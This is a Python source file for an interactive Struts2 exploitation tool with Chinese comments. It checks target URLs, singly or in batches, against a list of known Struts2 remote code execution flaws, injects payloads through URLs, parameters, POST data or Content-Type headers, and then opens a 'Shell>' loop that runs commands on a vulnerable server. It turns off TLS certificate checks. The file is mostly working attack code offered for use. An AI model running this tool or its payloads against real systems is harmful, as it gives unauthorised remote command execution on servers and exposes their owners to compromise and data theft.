#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#struts2 漏洞利用工具，基于已被爆出的struts2远程执行漏洞。
#功能：
#       输入struts版本，可以查看可能存在的漏洞与漏洞的利用点。
#       选定漏洞编号后。选定对应的参数，就可以开始攻击。
#       攻击内容为执行命令,交互式的。
#       有一个验证payload，会返回
#       1HelloWorld1

import sys
import getopt
import ssl
from urllib.request import urlopen, Request
from urllib.error import HTTPError, URLError
from urllib.parse import quote, urlparse, urlunparse
from http.client import IncompleteRead
import xml.etree.ElementTree as ET


#不认证ssl 证书的合法性
ssl._create_default_https_context = ssl._create_unverified_context

#读取漏洞信息 文件
info_tree = ET.parse('lib/s2_info.xml')
info_root = info_tree.getroot()

#读取payload xml 文件
payload_tree = ET.parse('lib/s2_payload.xml')
payload_root = payload_tree.getroot()


#有颜色的输出
def script_colors(color_type, text):

    color_end = '\033[0m'

    if color_type.lower() == 'r' or color_type.lower() == "red":
        red = '\033[91m'
        text = red + text + color_end
    elif color_type.lower() == 'lgray':
        lgray = '\033[2m'
        text = lgray + text + color_end
    elif color_type.lower() == 'gray':
        gray = '\033[90m'
        text = gray + text + color_end
    elif color_type.lower() == 'strike':
        strike = '\033[9m'
        text = strike + text + color_end
    elif color_type.lower() == 'underline':
        underline = '\033[4m'
        text = underline + text + color_end
    elif color_type.lower() == 'b' or color_type.lower() == 'blue':
        blue = '\033[94m'
        text = blue + text + color_end
    elif color_type.lower() == 'g' or color_type.lower() == 'green':
        green = '\033[92m'
        text = green + text + color_end
    elif color_type.lower() == 'y' or color_type.lower() == 'yellow':
        yellow = '\033[93m'
        text = yellow + text + color_end
    else:
        return text 
    
    return text


def usage():
    print('+---------------------------------------------------------------+')
    print(' -h          打印帮助文档')
    print(' -u          目标url')
    print(' -f          批量扫描，一行一个url')
    print(' -r          post文件,如果是https，则要使用-s选项')
    print(' -p          指定测试的参数,针对007,009')
    print(' -c          指定cookie')
    print(' -s          是否使用https,默认是n，y为使用')
    print(' -a          attack模式，可以交互式执行代码，默认只查找是否有漏洞')
    print(' -x          输出所有漏洞详情')
    print(' -t          输出指定编号的漏洞详情，可多个如001,005,007')
    print(' -v          查找某个版本号可能存在的漏洞，如2.2.2')
    print(' -b          指定扫描那个漏洞，可多个，逗号隔开，如001,005')
    print(' -V          详细输出，1 将输出payload,')
    print('                       2 将会输出http response 的数据')
    print(' -o          把结果输出到文件中，不打印在shell中。')
    print('此工具支持struts2的高危漏洞版本有：')
    print('     001, 005, 007, 009, 012, 013/014, 015, 016')
    print('     019, 029, 032, 033, 045, 048, 052, 053, devmode')
    print('默认会扫描的漏洞有：')
    print('     不指定参数情况下扫描005, 015, 016, 019, 032, 033, 045')
    print('                         052, devmode')
    print('     不指定参数的情况下的url应该不带任何参数如： ' + \
            'http://url/xx.action')
    print('     指定参数情况下扫描001, 007, 009, 012, 013， 029, 048, 053')
    print('注意目前052 因为不能回显')
    print('所以会尝试在web根目录下创建1HelloWorld1文件')
    print('+---------------------------------------------------------------+')
    

#根据输入的struts2 的版本号， 判定可能存在的漏洞号与信息。
def getinfo(version = '', vuln_id = '', is_all=False):
    
    i = []

    if  "2.0.0" <= version and version <= "2.0.8" or is_all or vuln_id == '001':
        i.append('001')       

    if "2.0.0" <= version and version <= "2.2.1" or is_all or vuln_id == '005':
        i.append('005')

    if "2.0.0" <= version and version <= "2.2.3.1" or is_all or vuln_id == '007':
        i.append('007')

    if "2.1.0" <= version and version <= "2.3.1.1" or is_all or vuln_id == '009':
        i.append('009')

    if "2.1.0" <= version and version <= "2.3.13" or is_all or vuln_id == '012':
        i.append('012')

    if "2.0.0" <= version and version <= "2.3.14.1" or is_all or vuln_id == '013':
        i.append('013')

    if "2.0.0" <= version and version <= "2.3.14.2" or is_all or vuln_id == '015':
        i.append('015')

    if "2.0.0" <= version and version <= "2.3.15" or is_all or vuln_id == '016':
        i.append('016')

    if "2.0.0" <= version and version <= "2.3.15.1" or is_all or vuln_id == '019':
        i.append('019')

    if "2.0.0" <= version and version <= "2.3.28" and version != "2.3.20" \
            and version != "2.3.24.2" or is_all or vuln_id == '032':
        i.append('032')

    if "2.3.20" <= version and version <= "2.3.28" and version != "2.3.20.3" \
            and version != "2.3.24.3" or is_all or vuln_id == '033':
        i.append('033')

    if "2.3.5" <= version and version <= "2.3.31" or "2.5" <= version and \
            version <= "2.5.10" or is_all or vuln_id == '045':
        i.append('045')

    if "2.0.0" <= version and version <= "2.3.32" or is_all or vuln_id == '048':
        i.append('048')
    
    if "2.1.2" <= version and version <= "2.3.33" or "2.5" <= version and \
            version <= "2.5.12" or is_all or vuln_id == '052':
        i.append('052')
    
    if "2.0.1" <= version and version <= "2.3.33" or "2.5" <= version and \
            version <= "2.5.10" or is_all or vuln_id == '053':
        i.append('053')
    
    if "2.1.0" <= version and version <= '2.5.1' or is_all or \
            vuln_id == 'devmode':
        i.append('devmode')
    
    for child in info_root:
        if child.attrib['id'] in i:
            print('漏洞名称：   {}'.format(child[0].text))
            print('影响版本：   {}'.format(child[1].text))
            print('漏洞详情:    {}'.format(child[2].text))
            print()
            print('出现点：     {}'.format(child[3].text))
            print()
            print()

#解析截取的http request请求数据， 返回url， headers， data数据。
def parsepost(filename):

    url = ''
    headers = {}
    data = ''
    with open(filename) as f:
        url = f.readline().strip().split(' ')[1]
        for line in f:
            if line == '\n':
                data = f.readline().strip()
                break
            ss = line.strip().split(':', 1)
            headers[ss[0]] = ss[1].strip()
    url = headers['Host'] + url
    return (url, headers, data)

#从xml中获取对应s2 漏洞的payloads
def get_payloads(vuln_id):

    scan_payload = ''
    attack_payload = ''
    for child in payload_root:
        if child.attrib['id'] == vuln_id:
            scan_payload = child[0].text
            attack_payload = child[1].text
    return (scan_payload, attack_payload)

#获取http返回数据中charset 的值，用于解码。
def getcode(ct):
    code = ''
    try:
        c = ct.split(';')
        for cc in c:
            if cc.split('=')[0] == 'charset':
                code = cc.split('=')[1]
    except:
        pass
    return code

#http请求，超时,网络不好等的情况下会请求3次。
def gethttp(url, headers, data=None, t=3):
    
    if not t:
        return ('', 0)

    if data:
        re = Request(url, headers=headers, data=data.encode('utf-8'))
    else:
        re = Request(url, headers=headers)
    try:
        with urlopen(re, timeout=30) as h:
            code = getcode(h.headers['Content-type'])
            try:
                return h.read().decode(code if code else 'utf-8'), h.code
            except IncompleteRead as e:
                return e.partial.decode('utf-8'), h.code
            except UnicodeDecodeError as e:
                return h.read().decode('gb2312'), h.code
    except HTTPError as e:
        code = getcode(e.headers['Content-type'])
        try:
            return e.read().decode(code if code else 'utf-8'), e.code
        except:
            return e.read().decode('gb2312'), e.code
    except Exception as e:
        print(script_colors("r", "Error: {}".format(e)))
        print(script_colors("b", "try again...."))
        return gethttp(url, headers, data=data, t=t-1)

#分类处理
#第一中类型，只需在url后添加payload即可
#第二中类型，需要使用-p指定那个参数
#第三中类型，不是上面的两种类型

#005, 016, 019, 032, 033, devmode
#001, 007, 009, 012, 013，029, 048, 053
#015, 045, 052

#注意：052 没办法回显，所以只能在web 根目录下创建一个1HelloWorld1.txt的文件。
#且052 暂时没法使用attack模式。

#扫描模式
def scan(url, headers, vuln, output, attack, verbose, data=None, p=''):

    for v in vuln:
        print(script_colors('b', '开始扫描，扫描漏洞： {}'.format(v)))
        d = data
        u = url
        payloads = get_payloads(v)
        if v in ('005', '016', '019', '032', '033', 'devmode'):
            u, d= link_method(u, payloads[0], 1)
        elif v in ('001', '007', '012', '013', '029', '048', '053'):
            u, d = link_method(u, payloads[0], 2, data=d)
        elif v == '009':
            pay = payloads[0].replace('####', p)
            u, d = link_method(u, pay, 2, data=d)
        elif v == '015':
            #解析url， 把payload接到.action,或者.do之前
            uu = list(urlparse(url))
            uuu = uu[2].split('/')
            index = uuu[-1].find('.')
            end = uuu[-1][index:]
            uuu[-1] = payloads[0] + end
            uu[2] = '/'.join(uuu)
            u = urlunparse(uu)
        elif v == '045':
            headers['Content-Type'] = payloads[0]
        elif v == '052':
            d = payloads[0]
            headers['Content-Type'] = 'application/xml'

        result, code= gethttp(u, headers, data=d)
        if verbose >= 1:
            if v == '009':
                print(script_colors('b', "Payload:  {}".format(pay)))
            else:
                print(script_colors('b', "Payload:  {}".format(payloads[0])))
        if verbose == 2:
            print("\nHTTP Response:\n{}\n".format(result))
        
        if v == '052':
            uu = list(urlparse(url))
            u = uu[0] + '://' + uu[1] + '/1HelloWorld1.txt'
            result, code= gethttp(u, headers)
            print(script_colors('b', '查看 {} 是否存在'.format(u)))
            if code == 200 and not len(result):
                print(script_colors('g', 'Lucky. 找到一个漏洞： 052'))
                print(script_colors('g', 'URL: {}'.format(url)))
                if attack:
                    print()
                    wi = warning_info(v)
                    if wi:
                        print(script_colors('y', '注意： {}'.format(warning_info(v))))
                    print()
                    attack_mode(v, url, headers, data, payloads[1], p, verbose)
            else:
                print(script_colors('b', '没有漏洞： 052'))
            continue
            
        if result.find('1HelloWorld1') >= 0:
            print(script_colors('g', 'Lucky. 找到一个漏洞： {}'.format(v)))
            print(script_colors('g', 'URL: {}'.format(url)))
            if attack:
                print()
                wi = warning_info(v)
                if wi:
                    print(script_colors('y', '注意： {}'.format(warning_info(v))))
                print()
                attack_mode(v, url, headers, data, payloads[1], p, verbose)
        else:
            print(script_colors('b', '没有漏洞： {}'.format(v)))

#攻击模式，交互式命令行
def attack_mode(v, url, headers, data, payload, p, verbose):
    print(script_colors('b', '开始攻击模式，交互式shell:'))
    while True:
        d = data
        u = url
        m = 0
        cmd = input("Shell> ").strip()
        if v in ('001', '012'):
            cmd = cmd.replace(' ', '","')
            pay = payload.replace('1payload1', quote(cmd, safe=''))
            m = 2
        elif v in ('019', ):
            cmd = cmd.replace(' ', '","')
            pay = payload.replace('1payload1', quote(cmd, safe=''))
            m = 1
        elif v in ('013', '029', '048', '053'):
            pay = payload.replace('1payload1', quote(cmd, safe=''))
            m = 2
        elif v in ('005', '016', '032', '033', 'devmode'):
            pay = payload.replace('1payload1', quote(cmd, safe=''))
            m = 1
        elif v == '007':
            cmd, size = cmd.split('@@@', 1)
            pay = payload.replace('####', size)
            pay = pay.replace('1payload1', quote(cmd, safe=''))
            m = 2
        elif v == '009':
            pay = payload.replace('1payload1', quote(cmd, safe=''))
            pay = pay.replace('####', p)
            m = 2
        elif v == '015':
            uu = list(urlparse(u))
            uuu = uu[2].split('/')
            index = uuu[-1].find('.')
            end = uuu[-1][index:]
            pay = payload.replace('1payload1', quote(cmd, safe=''))
            uuu[-1] = pay + end
            uu[2] = '/'.join(uuu)
            u = urlunparse(uu)
        elif v == '045':
            pay = payload.replace('1payload1', cmd)
            headers['Content-Type'] = pay
        elif v == '052':
            cmd = "".join(["<string>{0}</string>".format(_) for _ in cmd.split(" ")])
            pay = payload.replace('1payload1', cmd)
            d = pay
            headers['Content-Type'] = 'application/xml'
        u, d = link_method(u, pay, m, data=d)
        result, code = gethttp(u, headers, data=d)
        if verbose >= 1 and v != '005':
            print(script_colors('b', "Payload:  {}".format(pay)))
        if verbose == 2:
            print("\nHTTP Response:\n{}\n".format(result))
        re = parseresult(result)
        if re:
            print(script_colors('g', "Result： \n{}".format(re)))
        else:
            print(script_colors('b', '从http中提取数据失败，' + \
                    '可能在http response中，请仔细查看。'))
            if result and verbose != 2:
                print(result)
            print()

#payload,接入url,或data。
#u 为url, d 为 data, p 为payload，
#m 为mode
#0 为 不做处理，为了兼容其它特殊接入方法
#1 为 直接加到url上
#2 为替换 url， data 中****
def link_method(u, p, m, data=None):
    if m == 1:
        u = u + p
    elif m == 2:
        u = u.replace('****', p)
        if data:
            data = data.replace('****', p)
    return u, data

#解析attack_mode返回的数据，根据00000|data|00000,data为数据
#如果没有00000|,|00000 则返回全部数据
def parseresult(result):

    try:
        left = result.find('00000|')
        right = result.find('|00000')
        if left != -1 and right != -1:
            return result[left+6:right]
    except:
        return result

def main():
    
    url         =       ''
    filepath    =       ''
    postfile    =       ''
    p           =       ''
    cookies     =       ''
    is_https    =       False
    attack      =       False
    verbose     =       0
    version     =       ''
    output      =       ''

    vuln        =       ['005', '015', '016', '019', '032', '033', '045',
                         '052', 'devmode']

    headers = {"Accept" : "*/*", "Accept-Language":"en-US,en;q=0.5", 
            "Cache-Control":"no-cache", "Connection":"close",
            "User-Agent":
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"}

    try:
        opts, args = getopt.getopt(sys.argv[1:], 'hu:f:r:p:c:saxv:b:o:V:t:')
    except getopt.GetoptError(e):
        print(e)
        usage()
        sys.exit(1)

    for o,a in opts:
        if o == '-h':
            usage()
            sys.exit()
        elif o == '-u':
            url = a
        elif o == '-f':
            filepath = a
        elif o == '-r':
            postfile = a
        elif o == '-p':
            p = a
            vuln = ['001', '007', '009', '012', '013', '029', '048', '053']
        elif o == '-c':
            cookies = a
        elif o == '-s':
            is_https = True
        elif o == '-a':
            attack = True
        elif o == '-x':
            getinfo(is_all=True)
            sys.exit(0)
        elif o == '-t':
            for t in a.split(','):
                getinfo(vuln_id=t)
        elif o == '-v':
            getinfo(version=a)
            sys.exit(0)
        elif o == '-b':
            del(vuln[:])
            for b in a.split(','):
                vuln.append(b)
        elif o == '-o':
            output = a
        elif o == '-V':
            verbose = int(a)

    if cookies:
        headers['Cookie'] = cookies

    if url:
        if p:
            url = url_modify_p(url, p)
        scan(url, headers, vuln, output, attack, verbose, p=p)
    elif filepath:
        with open(filepath) as f:
            for l in f:
                u = l.strip()
                print(script_colors('b', 'Start scan: {}'.format(u)))
                if p:
                    u = url_modify_p(u, p)
                scan(u, headers, vuln, output, attack, verbose, p=p)
    elif postfile:
        r = parsepost(postfile)
        url = ('https://' if is_https else 'http://') + r[0]
        header = r[1]
        data = post_modify_p(r[2], p)
        scan(url, headers, vuln, output, attack, verbose, data=data, p=p)


#把post中-p指定的参数的值换成****
def post_modify_p(post, p):

    l = []
    post = post.split('&')
    for i in post:
        if i.split('=')[0] == p:
            l.append(p + '=' + '****')
        else:
            l.append(i)
    return '&'.join(l)


#把url中-p指定的参数的值换成****
def url_modify_p(url, p):
    l = []
    u = list(urlparse(url))
    uu = u[4].split('&')
    for uuu in uu:
        uuuu = uuu.split('=')
        if p == uuuu[0]:
            l.append(uuuu[0] + '=' + '****')
        else:
            l.append(uuu)
    u[4] = '&'.join(l)
    return urlunparse(u)

def warning_info(v):

    wi = ''
    if v == '007':
        wi = '007payload字节不能大于返回内容的字节，' + \
            '太小又会导致返回不全，所以这个测试只能手动指定字节大小' + \
            '如： shell> ls -l @@@50 来指定字节为50'
    if v == '052':
        wi = '052的payload没法回显，所以验证方法可以使用管道符' + \
                '传到./webapps/ROOT/中的一个文件中' + \
                '如： /bin/bash -c ls >> ./webapps/ROOT/test.txt'
    return wi

if __name__ == '__main__':
    main()
